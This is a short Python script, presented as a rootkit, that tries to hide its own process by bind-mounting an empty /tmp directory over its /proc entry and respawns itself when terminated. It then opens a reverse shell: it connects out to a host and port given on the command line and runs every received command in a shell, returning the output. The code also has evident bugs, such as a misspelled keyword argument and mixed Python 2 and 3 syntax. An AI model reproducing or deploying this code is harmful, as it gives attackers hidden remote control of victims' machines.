#!/usr/bin/python3.6
import socket
import urllib2
import sys  
import subprocess
import string
import random
import os
import signal
from time import sleep


class Rootkit:
    def relaunch(self, signal, frame):
        cmd  = sys.argv
        proc = subprocess.Popen(' '.join(cmd), stdout=subprocess.PIPE, strderr=subprocess.PIPE, shell=True) 
        print "[+] Respawning..."

    def hide_process(self):
        ch = string.uppercase + string.digits
        # Bind mount - works with root on linux
        token = "".join(random.choice(ch) for i in range(32))
        pid = os.getpid()
        print "[+] Current PID: {0}".format(pid)
        if os.path.isdir("/tmp/{0}".format(token)) is False:
            if os.system("sudo whoami") == 'root':
                os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
        signal.signal(signal.SIGTERM, self.relaunch)

    def shell_text(self, sock, data):
        return sock.send("[{0}]> ".format(data))

    def bind_shell(self, host=None, port=None):
        
        if host is None:
            return 0

        if port is None:
            port = int(44134)

        sleep(5)

        try: 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            cmd = ""

            while True:
                self.shell_text(sock, host)
                cmd = sock.recv(1024).encode("UTF-8")
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                proc_out = "{0} {1}\n".format(proc.stdout.read(), proc.stderr.read())
                sock.send(proc_out)
            sock.close()

        except Exception as error: 
            print "[-] Failed to create un socket: {0}".format(str(error))

        return 0

if __name__ == '__main__':
    rt = Rootkit()
    rt.hide_process()
    rt.bind_shell(sys.argv[1], int(sys.argv[2]))



   
